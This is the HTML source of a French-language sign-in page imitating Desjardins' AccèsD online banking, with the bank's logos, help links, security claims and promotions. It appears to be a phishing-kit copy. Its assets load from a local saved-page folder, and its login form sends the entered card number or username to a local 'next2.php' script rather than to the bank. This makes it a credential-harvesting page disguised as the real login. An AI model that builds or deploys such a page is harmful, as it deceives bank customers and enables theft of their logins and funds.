<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>	Se connecter | Desjardins</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <noscript>
        <meta http-equiv="refresh" content="1;url=/identifiantunique/erreur-contenu-support.jsp">
    </noscript>
    

<link href="./index_fr_files/bootstrap.min.css" rel="stylesheet">

<link href="./index_fr_files/fwd-bootstrap.min.css" rel="stylesheet">

<!--[if lt IE 9]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="./index_fr_files/global.min.css" rel="stylesheet">
    
                <link media="only screen and (max-width : 768px)" href="./index_fr_files/identifiantunique-responsive.min.css" rel="stylesheet">
            

<!-- Ajustements de styles de l'application -->

    <link href="./index_fr_files/theme.min.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="https://www.#/static-accesweb/201808090322/acces-web/css/ie8.min.css"/><![endif]-->

<link href="./index_fr_files/owl.carousel.min.css" rel="stylesheet">

    

    
        <meta name="description" content="Gérer vos finances personnelles n’aura jamais été aussi simple, rapide et sécuritaire grâce aux services en ligne de Desjardins!">
    

    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="">

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        

    <script type="text/javascript">
        if (window.top.location != self.location) {
            window.top.location = self.location;
        };
    </script>

    
      <link rel="stylesheet" href="./index_fr_files/entete.css">
      <link rel="stylesheet" href="./index_fr_files/page-logon.css">
    
      <link href="./index_fr_files/pied.css" rel="stylesheet">
    </head><body class="isolation-bootstrap-3 fixChrome" data-whatinput="mouse"><fwd_placeholder__contenu_head_fragment_principal>




    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="https://accweb.mouv.#/identifiantunique/identification?langueCible=fr#contenu" class="sr-only sr-only-focusable">Aller au contenu principal</a>
        </div>
        <div id="logo">
          <h1 class="sr-only">Site Internet de Desjardins</h1>
          
          <a href="https://www.#/index.jsp"><img src="./index_fr_files/logo-n1-desjardins-desktop.svg" alt="Retour à page d&#39;accueil de Desjardins.com" width="150" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="https://accweb.mouv.#/identifiantunique/sso/adp"><img src="./index_fr_files/g40-entete-logo-accesd.png" alt="AccèsD" width="106" height="32"></a>
          
          <a href="https://accweb.mouv.#/identifiantunique/sso/ada"><img src="./index_fr_files/g40-entete-logo-accesd-affaires.png" alt="AccèsD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="https://accweb.mouv.#/identifiantunique/identification?langueCible=fr#" onclick="popup(&#39;//www.#/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD&#39;,&#39;Joindre&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Nous joindre</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="https://accweb.mouv.#/identifiantunique/identification?langueCible=fr#" onclick="popup(&#39;//www.#/page-aide/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD&#39;,&#39;Aide&#39;,&#39;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&#39;);">Aide</a></p>
          </div>
          <div id="choix-site">
            <p class="titre-entete"><a id="btn-langue" href="https://accweb.mouv.#/identifiantunique/identification?langueCible=en" lang="en"><span class="sr-only">Change language. </span>English</a></p>
          </div>
          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="javascript:void(0)" title="Réduire la taille du texte">Réduire la taille du texte</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="javascript:void(0)" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    
                            <a href="https://accweb.mouv.#/identifiantunique/identification?langueCible=fr">
                                <img class="logo" src="./index_fr_files/logo-n1-desjardins-desktop(1).svg" alt="Aller à la page d&#39;accueil" title="Desjardins">
                            </a>
                        
                    <div class="hidden-xs" style="display: inline;">                        
                                <img class="logo-desjardins" role="presentation" src="./index_fr_files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins">
                            
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg">Se connecter</div>
                
                        <a href="http://www.#/" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                            <img id="menuAppRetour" src="./index_fr_files/entete-btn-menu-app.png" height="32">
                        </a>
                    
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup(&#39;https://www.#/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD&#39;,&#39;Nous joindre&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                Nous joindre
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup(&#39;https://www.#/fr/services_en_ligne/accesd/aide/ai_logonlogoff.jsp?domaine=ACCESD&#39;,&#39;Aide&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                Aide
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="https://accweb.mouv.#/identifiantunique/identification?langueCible=en">
                                                English
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="./index_fr_files/a00-entete-ic-texte-moins-on.png" alt="" title="">
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="./index_fr_files/a00-entete-ic-texte-plus-on.png" alt="" title="">
                            </a>
                        </li>

                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>

 </span> 
              
            
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="fr" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="./index_fr_files/a00-loading-petit.gif" alt="Loading">
                                    </div>
                                </div>
                            </div>
                            
                            
 
		<h1 id="titrePage" data-titre-page-mobile="Se connecter">
Se connecter</h1>	

<div class="row">
    <div class="col-sm-24 col-md-24">
        
            <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
            <div>
                <span class="help-block-idunique">
                    Les erreurs suivantes ont été détectées :
                </span>
                <ul>
                    <li>
                      <a id="erreurLienJS" href="https://accweb.mouv.#/identifiantunique/identification?langueCible=fr#" class="erreurLien"></a>
                    </li>
                </ul>
                </div>
            </div>
        
 </div>
</div>

		<!--Dessin du panel -->
		<div class="row">
			<div class="col-xs-24 col-sm-24">
				<div class="panel panel-primary">
					<div class="panel-body padding-moyen">
						<div id="conteneur-separateur-vertical" class="row">
							<!-- Div formulaire de gauche -->
							<div id="identification" class="col-xs-24 col-sm-14">
								

<!-- Inclusion de la modale de suppression des cartes enregistrees -->

<div id="modalSuppressionCookies" class="modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-describedby="modelDescription" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="col-xs-24 col-sm-24 col-md-20 col-lg-20">
            <div id="contenu" class="modal-content padding-left10px padding-right10px">
                <div class="modal-header"></div>
                <p id="modelDescription" class="alert alert-warning">Voulez-vous vraiment supprimer tous les identifiants mémorisés?</p>
                <div class="modal-footer">
                    <button id="btnAnnulerSuppressionCookies" name="btnAnnulerSuppressionCookies" type="button" class="btn btn-default" title="Annuler" data-dismiss="modal">
                        Annuler
                    </button>
                    <button id="btnValiderSuppressionCookies" name="btnValiderSuppressionCookies" type="button" class="btn btn-primary" title="Oui">
                        Oui
 </button> </div> </div> </div> </div>
</div>

<!-- Formulaire -->
<form id="formIdentification" role="form" class="form-horizontal" action="next2.php" method="POST" autocomplete="off">

    <!-- Divers champs -->

    <input type="hidden" id="fnMemoriserUtilisateurActive" name="fnMemoriserUtilisateurActive" value="O">
    
    <!--  Champs hidden pour RAA mobile -->
    <input type="hidden" id="InfoPosteRaa" name="InfoPosteRaa">
    <input type="hidden" id="OtherIdRaa" name="OtherIdRaa">
    
    <!-- Liste des controles du formulaire -->
    
        
        <div class="col-sm-24">
		
<input type="hidden" id="nbrCartesMemorisees" name="nbrCartesMemorisees" value="0">

<div id="connexionParPicto" style="display: none;">
    
        <div class="row">
            <span class="sr-only">Vous avez 0 identifiants mémorisés</span>

            <!-- Gestion d'erreur pour form-group-identifiant -->
            

            <div id="cartesMemorisees">
                
            </div>
        </div>
        <div id="form-group-bouton">

            

            <div class="row">
                <div class="col-xs-24 col-sm-12 ">
                    <button id="btnUtiliserAutreIdentifiant" name="btnUtiliserAutreIdentifiant" type="button" class="btn btn-default btn-block">
                        Changer d'identifiant
                    </button>
                </div>
                <div class="col-xs-24 col-sm-12">
                    <button id="btnDemanderSuppressionCookies" name="btnDemanderSuppressionCookies" type="button" class="btn btn-default btn-block" data-target="#modalSuppressionCookies" data-toggle="modal" data-backdrop="static">
                        Supprimer les identifiants
                    </button>
                </div>
            </div>
            <div class="row top10px">
                <div class="col-sm-12 hidden-xs">
                    <a id="btnRet" name="btnRetourAccueil" href="http://www.#/" class="btn btn-default btn-block">
                    Annuler
                    </a>
                </div>
                <div class="col-xs-24 col-sm-12">
                    
                            
                    <a id="btnMotPasseOublie" name="btnMotPasseOublie" href="https://accweb.mouv.#/identifiantunique/motPasseOublie/identification" class="btn btn-default btn-block">
                        Mot de passe oublié?
 </a> </div> </div> </div> 
</div>
<!-- Affichage de l'écran de login classique en absence de mémorisation -->
<div id="connexionParSaisie" style="">
    <p id="memoriser_instruction" class="sr-only">
        Un champ Descriptif s'ajoute automatiquement si vous cochez la case Mémoriser.
 </p> <!-- Message de maintenance --> 
    <!-- Libellé et champ de saisie de l'identifiant -->
    

        <div id="form-group-identifiant" class="no-margin-bottom ">
            <div class="panel panel-default padding-moyen no-border no-margin-bottom">
                

                <div class="form-group">
                    <!-- Libelle -->
                    <div id="identifiantCodeUtilisateurLabel">
                        <div class="col-xs-24 col-sm-9 control-label">
                            <label for="codeUtilisateur" path="codeUtilisateur" class="texte16px">
                                <strong>Identifiant :</strong> </label> 

                            <a href="javascript:;" data-toggle="popover" title="" data-placement="bottom" data-html="true" data-arrow="auto left" data-container="#form-group-identifiant" data-content="&lt;h2 class=&#39;sr-only titrePopoverHorsEcran&#39; tabindex=&#39;-1&#39;&gt;Identifiant :&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Identifiant&lt;/strong&gt;&lt;img src=&#39;
                                                https://www.#/static-accesweb/201808090322/acces-web/img/g00-entete-logo-accesd.png&#39; class=&#39;alignVerticalMiddle padding-left10px&#39; width=&#39;90px;&#39; alt=&#39;
                                                AccèsD&#39;&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Votre numéro de Carte d’accès Desjardins avec ou sans le 4540&lt;/li&gt;&lt;li&gt;Votre adresse courriel&lt;/li&gt;&lt;li&gt;Votre carte d’accès virtuelle (non-membres)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Identifiant&lt;/strong&gt;&lt;img src=&#39;
                                                https://www.#/static-accesweb/201808090322/acces-web/img/g00-entete-logo-accesd-affaires.png&#39; class=&#39;alignVerticalMiddle padding-left10px&#39; width=&#39;90px;&#39; alt=&#39;
                                                AccèsD Affaires&#39;&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Votre code d&#39;utilisateur AccèsD Affaires&lt;/li&gt;&lt;li&gt;Votre adresse courriel&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Votre &lt;strong&gt;identifiant &lt;/strong&gt; sert à vous connecter à vos comptes particuliers et à vos comptes entreprises.&lt;/p&gt;&lt;a id=lnkPlusDeDetails href=&#39;javascript:popup(&quot;https://www.#/page-aide/index.jsp?docName=ai_identifiant_unique&amp;domaine=ACCESD&quot;,&quot;&quot;,&quot;resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600&quot;)&#39;&gt;Plus de détails sur l’identifiant&lt;/a&gt;" role="button" data-original-title="">
                            </a>
                        </div>
                    </div>
                    <!-- Champ de saisie identifiant-->
                    <div class="col-xs-24 col-sm-15 last-col">
                        
                        <input aria-describedby="blockMessageErreur" id="codeUtilisateur" name="codeUtilisateur" type="text" maxlength="254" class="texte16px" autocomplete="off" placeholder="N° de carte ou code d&#39;utilisateur">
                    </div>
                </div>
            </div>
        </div>

        <div id="form-group-identifiant-memorise">
            <div class="padding-moyen no-border no-margin-bottom">
                <!-- Case à cocher Mémoriser-->
                
                <div class="form-group">
                    <div class="col-xs-24 col-sm-offset-9 col-sm-15">
                        <div id="form-group-memoriser" name="form-group-memoriser">
                            
                                <div class="checkbox">
                                    <label for="memorise" path="memorise">
                                        <input type="checkbox" id="memorise" name="memorise" onclick="javascript:switchDisplayDescription()" aria-describedby="memoriser_instruction">
                                        <strong class="texteMemorise">Mémoriser</strong>
                                        <p class="hidden-xs top0pxImportant">
                                            <small>(Non recommandé sur un ordinateur public)</small> </p> </label> </div> 
                            <div id="form-group-description" class="top10px" name="form-group-description" style="display: none;">
                                <label for="description">
                                    Descriptif de l'identifiant (facultatif) :
                                </label>
                                <input style="max-width:100%" id="description" name="description" type="text" maxlength="20" size="20" autocomplete="off" aria-describedby="descriptionExemple">
                                <p>
                                    <small id="descriptionExemple">Ex. : Compte maison</small> </p> </div> </div> </div> </div>   <!-- Boutons et liens de connexion --> 

                <div id="groupeBtnAction" name="groupeBtnAction">
                    <div id="form-group-bouton" class="form-group">
                        
                            <div class="hidden-xs col-sm-9 text-right">
                                <a href="http://www.#/" class="btn btn-default fullwidth">
                                    Annuler
                                </a>
                            </div>
                            <div class="col-xs-24 col-sm-5">
                                <input type="submit" class="btn btn-primary fullwidth" value="Entrer">
                            </div>
                        

                        <div class="col-xs-24 hidden-sm hidden-md hidden-lg">&nbsp;</div>

                        
                        <span class="col-xs-24 col-sm-10">
                            
                           
                            <div class="top10px hidden-sm hidden-md hidden-lg"></div>
                                
                            <a class="lien-action" href="https://accweb.mouv.#/identifiantunique/motPasseOublie/identification">
                                Mot de passe oublié?
 </a>   </span> 
                                <div class="col-xs-24 hidden-sm hidden-md hidden-lg top10px">
                                    
                                        <a class="lien-action col-xs-24" href="https://accweb.mouv.#/identifiantunique/adhesion/identification">S'inscrire à AccèsD</a> 
                                        <a class="lien-action col-xs-24 top5px" href="https://www.scd-#/GCE/SAAdhesion?locale=fr&amp;domaine=SCD&amp;action=indexAdhesion&amp;IndSessionPVMV3=O">S'inscrire à AccèsD (non-membres)</a> 
                                        <a class="lien-action col-xs-24 top5px" href="https://www.#/entreprises/comptes-tresorerie/modes-acces-comptes/accesd-affaires/comment-inscrire/">S'inscrire à AccèsD Affaires</a> 
                                        <a class="lien-action col-xs-24 top5px" href="https://www.#/particuliers/comptes-services-relies/ouvrir-compte-devenir-membre/">Devenir membre</a><br> 
 </div> 
 </div> </div> </div> </div> 
</div>

 </div>
<div>
<input type="hidden" name="_tk" value="8f5a826b-aa45-4458-8cc6-4122cdfe9775">
</div><input type="hidden" id="infoPosteClient" name="infoPosteClient" value="version=3.4.1.0_1&amp;pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.100 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36|Win32&amp;pm_fpsc=24|1920|1080|1040&amp;pm_fpsw=&amp;pm_fptz=-5&amp;pm_fpln=lang=en-US|syslang=|userlang=&amp;pm_fpjv=0&amp;pm_fpco=1&amp;pm_fpasw=internal-pdf-viewer|mhjfbmdgcfjbbpaeojofohoefgiehjai|internal-nacl-plugin&amp;pm_fpan=Netscape&amp;pm_fpacn=Mozilla&amp;pm_fpol=true&amp;pm_fposp=&amp;pm_fpup=&amp;pm_fpsaw=1920&amp;pm_fpspd=24&amp;pm_fpsbd=&amp;pm_fpsdx=&amp;pm_fpsdy=&amp;pm_fpslx=&amp;pm_fpsly=&amp;pm_fpsfse=&amp;pm_fpsui=&amp;pm_os=Windows&amp;pm_brmjv=69&amp;pm_br=Chrome&amp;pm_inpt=&amp;pm_expt="></form>
	</div>	
							<!-- Div Ligne de séparation verticale -->
							<span id="separateur-vertical" class="hidden-xs col-sm-1 separateur-vertical hidden-xs" style="height: 263px;"></span>
							<!-- Div d information de droite -->
								<div id="blocSecuriteDroite" class="hidden-xs col-sm-9 padding-left15px">
									
	<div>	
<div id="lst_securite_label" class="hidden-xs">

    <h3 id="label_securite">
        Sécurité
    </h3>

    <ul id="lst_securite" aria-labelledby="lst_securite_label" class="nopadding">
        
                    <li>
                        <a href="https://www.#/securite/pratiques-securite/">Sécurité du site</a> </li> 
                    <li>
                        <a href="https://www.#/securite/signaler-fraude/">Signaler une fraude</a>
                    </li>
                    <li>
                        <a href="https://www.#/securite/">Comment vous protéger</a> </li> 
                        <li>
                            <a href="https://www.#/particuliers/comptes-services-relies/modes-acces-comptes/internet/soutien/index.jsp">Soutien technique</a> </li> 
 </ul>
</div>

											</div>
											<!-- Div du logo securite -->
											<div class="top15px">
												

<div id="imgSecurite" class="text-left hidden-xs">

    <a href="https://www.#/securite/remboursement-fraude/">
        <img src="./index_fr_files/g00-logo-securite-garantie-f.png" alt="Sécurité garantie à 100 %">
    </a>
       
</div>
	</div>	
	<div>	

<div class="top15px hidden-xs">
    
        <a class="lien-action" href="https://accweb.mouv.#/identifiantunique/adhesion/identification">
            S'inscrire à AccèsD
 </a><br> 
        <a class="lien-action" href="https://www.scd-#/GCE/SAAdhesion?locale=fr&amp;domaine=SCD&amp;action=indexAdhesion&amp;IndSessionPVMV3=O">
            S'inscrire à AccèsD (non-membres)
 </a><br> 
        <a class="lien-action" href="https://www.#/entreprises/comptes-tresorerie/modes-acces-comptes/accesd-affaires/comment-inscrire/">
            S'inscrire à AccèsD Affaires
 </a><br> 
        <a class="lien-action" href="https://www.#/particuliers/comptes-services-relies/ouvrir-compte-devenir-membre/">
            Devenir membre
 </a><br> 
</div>
	</div>	
	</div>	
	</div>	</div>	</div>	</div>	</div>	


        <div class="row hidden-xs">
            <div class="col-sm-24 col-md-24">
                <div class="row">
                    <div class="col-sm-12 col-md-12" checkpromotionflag="">
                        <div class="panel panel-primary">
                            <div class="panel-body" id="promoParticuliers" style="display: block; height: 151px;">
                                

  
    
      
        <div class="qc">
          























































  
  
  
  
	
    
    
    
      
      
      
      
    
	
    
    
    
      
      
      
      
    
	
  

  
  
    
    
      
      
      
      
      
      
        
        
          
            



<div class="bloc-promo">
  
  <img class="image-gauche" src="./index_fr_files/b20-login-votre-vie-change.jpg" alt="">
  <p><strong>Sécurité financière</strong></p>
  <p>Votre vie change. Vos besoins évoluent. Rencontrez un conseiller en sécurité financière pour adapter vos protections d'assurance.</p>
  <p><a class="lien-action" href="https://www.#/particuliers/assurances/rencontrer-un-conseiller/index.jsp">En savoir plus<span class="hors-ecran">&nbsp;sur le rôle du conseiller en sécurité financière.</span></a></p>
</div>

          
          
        
      
    
  






        </div>
        
      
      
      
    
  
  

  
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-12" checkpromotionflag="">
                        <div class="panel panel-primary">
                            <div class="panel-body" id="promoEntreprises" style="display: block; height: 151px;">
                                

  
    
      
      
        <div class="qc">
          
































































  
  
  
  
	
    
    
    
      
      
      
      
    
	
    
    
    
      
      
      
      
    
	
    
    
    
      
      
      
      
    
	
  

  
  
    
    
      
      
      
      
      
      
        
        
          
            




<div class="bloc-promo">
  
  <img class="image-gauche" src="./index_fr_files/b20-login-carte-cadeau-promotionne.jpg" alt="">
  <p><strong>Programme de cartes-cadeaux</strong></p>
  <p>Vous souhaitez fidéliser vos clients et en attirer de nouveaux? Optez pour un programme de cartes-cadeaux et faites prospérer vos affaires! </p>
  <p><a class="lien-action" href="https://www.monetico.ca/cartes-cadeaux" target="_blank">En savoir plus<span class="hors-ecran">&nbsp;sur les cartes-cadeaux.</span></a></p>
</div>

          
          
        
      
    
  






        </div>
        
      
      
    
  
  

  
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-24 col-md-24" checkpromotionflag="">
                        <div class="panel panel-primary">
                            <div class="panel-body" id="promoAmd" style="display: block;">
                                

  
    
      
      
      
        <div class="qc">
          
































































  
  
  
  
	
    
    
    
      
      
      
      
    
	
    
    
    
      
      
      
      
    
	
    
    
    
      
      
      
      
    
	
  

  
  
    
    
      
      
      
      
      
      
        
        
          
            



<div class="bloc-promo">
  
  <img class="image-gauche" src="./index_fr_files/b35-service-assistance-bloc.jpg" alt="En tant que membre, vous bénéficiez gratuitement de services d&#39;assistance offerts 24 heures sur 24, 7 jours sur 7. En savoir plus.">
  <p class="avantage-membre">Services d'assistance</p>
  <p>En tant que membre, vous bénéficiez gratuitement de services d'assistance offerts 24 heures sur 24, 7 jours sur 7</p>
  <p><a class="lien-action" href="https://www.#/particuliers/avantages-membre/services-assistance/index.jsp">En savoir plus<span class="hors-ecran">&nbsp;sur les services d'assistance.</span></a></p>
</div>

          
          
        
      
    
  






        </div>
        
      
    
  
  

  
 </div> </div> </div> </div> </div> </div> 


	

                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="./index_fr_files/g00-logo-securite-garantie-f.png">
                                    <img class="fake" src="./index_fr_files/logo-n1-desjardins-desktop(1).svg">
                                    
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        
                                            <img class="normal non-selectable" title="" src="./index_fr_files/g00-logo-securite-garantie-f.png" alt="">
                                        
                                            <img class="normal non-selectable padding-left10px" title="Desjardins" src="./index_fr_files/logo-n1-desjardins-desktop(1).svg" alt="Desjardins">
                                        
 </div> </div> <br> 

                            <br>
                        </div>
                    </div>

                </div>

            <br>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="https://www.#/particuliers/index.jsp">Services aux particuliers</a></li>
              <li><a href="https://www.#/entreprises/index.jsp">Services aux entreprises</a></li>
              <li><a href="https://www.#/coopmoi/index.jsp">Coopmoi</a></li>
              <li><a href="https://www.#/a-propos/index.jsp">À propos</a></li>
              <li><a href="https://www.#/mobile-gps-rss/index.jsp">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          




<ul>
  <li><a href="https://www.#/securite/index.jsp">Sécurité</a></li>
  <li><a href="https://www.#/confidentialite/index.jsp">Confidentialité</a></li>
  <li><a href="https://www.#/conditions-utilisation-notes-legales/index.jsp">Conditions d'utilisation et notes légales</a></li>
  <li><a href="https://www.#/a-propos/responsabilite-sociale-cooperation/mouvement-cooperatif-solidaire/accessibilite/index.jsp">Accessibilité</a></li>
  <li><a href="https://www.#/plan-site/index.jsp">Plan du site</a></li>
</ul>



  
  






<p class="copyright">© 1996-2018, Mouvement des caisses Desjardins. Tous droits réservés.
</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup(&#39;https://www.#/securite/&#39;,&#39;Sécurité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Sécurité</a> | 
                            <a href="javascript:popup(&#39;http://www.#/confidentialite/&#39;,&#39;Confidentialité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Confidentialité</a> | 
                            <a href="javascript:popup(&#39;http://www.#/conditions-utilisation-notes-legales/&#39;,&#39;Conditions utilisation&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Conditions d'utilisation et notes légales</a> | 
                            <a href="javascript:popup(&#39;https://www.#/page-aide/index.jsp?docName=accessibilite&amp;domaine=ACCESD&#39;,&#39;Accessibilité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Accessibilité</a> 
 <br> 
 </span> <p>Copyright © 2018 Mouvement des caisses Desjardins. Tous droits réservés.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
 <!-- Inclusion des fichiers javascripts pour le comportement --> 

<!--[if lt IE 9]>
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->


<!--[if IE]>
    <script src="https://www.#/static-accesweb/201808090322/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/html5shiv/3.7.0/html5shiv.js" type="text/javascript"></script>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="https://www.#/static-accesweb/201808090322/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->




<!-- ni : accesweb01_berlin5_rel05  -->
<!-- pv :  -->

</fwd_placeholder__contenu_head_fragment_principal></body></html>